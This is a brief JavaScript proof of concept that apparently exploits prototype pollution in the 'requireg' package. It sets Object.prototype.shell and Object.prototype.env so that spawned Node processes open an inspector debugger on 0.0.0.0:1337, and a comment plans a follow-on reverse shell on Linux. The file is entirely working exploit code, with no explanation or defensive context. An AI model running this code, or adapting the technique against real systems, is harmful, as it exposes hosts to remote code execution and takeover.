var requireg = require('requireg');

Object.prototype.shell = 'node'
Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

// TODO: try a reverse shell on Linux

var modulePath = requireg.resolve('npm');